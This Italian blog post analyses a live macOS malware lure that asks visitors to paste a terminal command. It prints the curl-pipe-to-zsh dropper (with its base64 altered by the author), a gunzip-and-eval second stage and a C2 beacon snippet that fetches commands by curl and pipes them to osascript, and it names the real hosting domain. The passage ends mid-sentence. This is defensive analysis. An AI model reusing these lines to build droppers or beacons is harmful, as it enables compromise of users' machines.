---
title: Analisi di un C2 per OSX
url: https://roccosicilia.com/2026/02/17/analisi-di-un-c2-per-osx/
source: Over Security - Cybersecurity news aggregator
date: 2026-02-17
fetch_date: 2026-02-18T04:15:55.175174
---

# Analisi di un C2 per OSX

# [Rocco Sicilia](https://roccosicilia.com)

Search

* [Home](https://roccosicilia.com)
* [About me](https://roccosicilia.com/about/)
* [Divulgazione](https://roccosicilia.com/progetto-di-divulgazione/)
* [Sostieni il progetto](https://roccosicilia.com/sostieni-il-progetto/)
* [English version](https://medium.com/%40roccosicilia)

[cyber security](https://roccosicilia.com/category/cyber-security/), [hacking](https://roccosicilia.com/category/hacking/), [ita](https://roccosicilia.com/category/ita/)

## [Analisi di un C2 per OSX](https://roccosicilia.com/2026/02/17/analisi-di-un-c2-per-osx/)

Published by

Rocco Sicilia

on

[17 febbraio 2026](https://roccosicilia.com/2026/02/17/analisi-di-un-c2-per-osx/)

[![Analisi di un C2 per OSX](https://roccosicilia.com/wp-content/uploads/2026/02/screenshot-2026-02-17-at-13.04.13.png?w=1024)](https://roccosicilia.com/2026/02/17/analisi-di-un-c2-per-osx/)

Stavo cercando un documento in PDF per mio figlio, una delle tante ricerche, ed uno dei risultati di ricerca era questo sito (ancora online al momento della pubblicazione del post):

![](https://roccosicilia.com/wp-content/uploads/2026/02/image-6.png?w=1024)

Screenshot del 15 febbraio 2026

Chi è del mestiere, nel vedere un sito che ti dice di eseguire un comando sul tuo terminale, sente già puzza di bruciato. Visto che l’ambito lo studio delle tecniche di attacco fa parte dei miei interessi e del mio lavoro ho colto l’occasione per analizzare l’azione del bad-actor più in dettaglio.

> **Nota importante**: non fate prove a caso con il contenuto di questo post in quanto vengono discussi **payload veri** che, al momento della pubblicazione, sono ancora attivi.

#### Analisi del sito web

Prima di buttarci sul comando ha senso dare una sbirciata al sito web in questione: *datacloudhost4[dot]baby*. Dall’Italia risolve su 104.21.50.157 (CloudFlare) ed una banale verifica whois ci dice che questo sito .baby è praticamente un (quasi) baby-domain:

```
Domain Name: DATACLOUDHOST4.BABY

Registry Domain ID: D624431052-CNIC

Registrar WHOIS Server: whois.dynadot.com

Registrar URL: http://www.dynadot.com

Updated Date: 2025-12-24T06:59:34.0Z

Creation Date: 2025-12-24T06:58:24.0Z

Registry Expiry Date: 2026-12-24T23:59:59.0Z

Registrar: Dynadot LLC

Registrar IANA ID: 472
```

Il dominio esiste da meno di due mesi, questo probabilmente lo fa già uscire dai radar dei domini “troppo giovani” in quanto solitamente i sospetti scattano con domini che hanno meno di 30 giorni di vita, ma questo dipende anche dai livelli di paranoia.

Analizzando il contenuto HTML uno dei riferimenti porta allo script “page-loader.js” che a differenza di altre componenti presenta commenti al codice JS con caratteri cirillici:

![](https://roccosicilia.com/wp-content/uploads/2026/02/image-7.png?w=1024)

Lo script in questione si occupa di gestire il contenuto del comando che viene riportato nel campo <input> prelevato direttamente dal file data.txt. È inoltre presenta la funzione che consente il “copy” del comando tramite il bottone “Copy command”.

Si potrebbe approfondire di più sull’host, ma il richiamo del comando è troppo forte 🙂

#### Primo stage: il comando iniziale

```
echo "Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup421415.dmg"

&& curl -kfsSL $(echo 'ZWNobyAnSW5zdG...'|base64 -D)|zsh
```

Intanto bisogna dire che il “copy” funziona e visto che ne ho trovati anche di non funzionanti possiamo dire che un minimo di cura anche nella delivery è stata messa. Altra nota importante: ho ovviamente modificato il contenuto del comando, in particolare la stringa base64 per evitare che qualche furbo si faccia compromettere la macchina facendo prove a caso (vedi nota iniziale).

I comando è molto semplice: esegue la *print* della stringa “Apple-Installer: <https://apps.apple.com/hidenn->*[blablabla]*.dmg” sul terminale come se sia stata avviata l’installazione di un’App e successivamente esegue una combo di comandi:

```
curl -kfsSL $(echo 'ZWNobyAnSW5zdG...'|base64 -D)|zsh
```

Analizziamoli un pezzo alla volta e partiamo dall’**echo**. La sequenza mira a generare un valore che è il risultato della decodifica della stringa grazie al comando **base64 -D** (che su MacOS è il flag per la decodifica).

La conversione genera quindi un nuovo contenuto che possiamo analizzare a mano o, usando la shell, possiamo verificare il contenuto direttamente osservando l’output del comando facendo attenzione a non farlo eseguire:

![](https://roccosicilia.com/wp-content/uploads/2026/02/image-8.png?w=1024)
![](https://roccosicilia.com/wp-content/uploads/2026/02/image-9.png?w=1024)

Dagli output si nota che l’intenzione del primo comando è eseguire il download di un contenuto appoggiato su un ulteriore sito web (durante l’analisi questo dominio è cambiato un paio di volte). Anche di questo contenuto si vorrebbe tentare l’esecuzione via **zsh**.

#### Secondo stage: drop del payload

Sempre facendo attenzione a cosa si fa possiamo eseguire il download del contenuto, usando ancora **curl** ed evitando di passare l’output a **zsh**:

![](https://roccosicilia.com/wp-content/uploads/2026/02/image-10.png?w=1024)

Questo output è più interessante del precedente: il contenuto è uno script che contiene un’altra stringa (?) *encoded* in base64 che viene passata come parametro al comando **gunzip**. Questo fa supporre che il contenuto in questione non sia una stringa ma la rappresentazione di uno zip file “encodata” in base64.

Apparentemente ciò che si sta tentando di fare è prendere un file in formato zip, estrarne il contenuto opportunamente *decoded*, metterlo in una variabile “**$d31228**” ed eseguirlo tramite il comando **eval**. Tralasciamo il riferimento con la stringa ‘PAYLOAD\_m…” come se non fosse evidente ciò che stiamo osservando.

Se rimuoviamo dallo script il comando eval otteniamo la generazione della variabile con il contenuto che ci interessa e possiamo visionarne il contenuto:

![](https://roccosicilia.com/wp-content/uploads/2026/02/image-11.png?w=1024)

Nota: nelle mie modifiche il **-D** diventa **-d** per conformare lo script a linux considerando che il bad-actor lo ha implementato per OSX.

Ora abbiamo il payload che si voleva eseguire e possiamo analizzarlo con calma.

#### Terzo stage: esecuzione del payload

Cosa fa lo script che abbiamo trovato? Non è nulla di complesso ma la cosa mi ha interessato in quanto mi capita di rado di lavorare su client OSX. Se siete poco avvezzi allo shell scripting – male – potete chiedere un aiuto ad un LLM che per questo tipo di compiti è un buon supporto. Ovviamente se siete figure tecniche del mondo IT o SEC e avete bisogno di un LLM per leggere uno script è bene che siate consapevoli del fatto che probabilmente avete un problema di competenze. Qui analizzo le parti più interessanti del payload.

Lo script è sostanzialmente identificato dalla funzione “daemon\_function()” che viene poi richiamata nello stesso file per avviare un processo che gira silenziosamente sul sistema target.

```
exec </dev/null

exec >/dev/null

exec 2>/dev/null
```

Per prima cosa l’attaccante si preoccupa di evitare output di ogni tipo per evitare di rendere troppo visibile il processo che inevitabilmente sarà visibile almeno nella process list.

```
curl -k -s --max-time 30 \

-H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" \

-H "api-key: $api_key" \

"http://$domain/dynamic?txd=$token" | osascript
```

I comandi vengono prelevati dal C2 server tramite una http GET, metodo abbastanza classico che ho deciso di usare anche nel mio C2. Uno dei dettagli su cui mi è caduto l’occhio è l’impostazione di uno user-agent coerente con il sistema operativo. Mi è capitato di discutere con alcuni SOC team in merito ai metodi di rilevazione delle sessioni C2 ed un elemento che spesso viene preso in considerazione è lo user-agent delle sessione http: in presenza di dati insoliti o incoerenti un SIEM, opportunamente dotato di...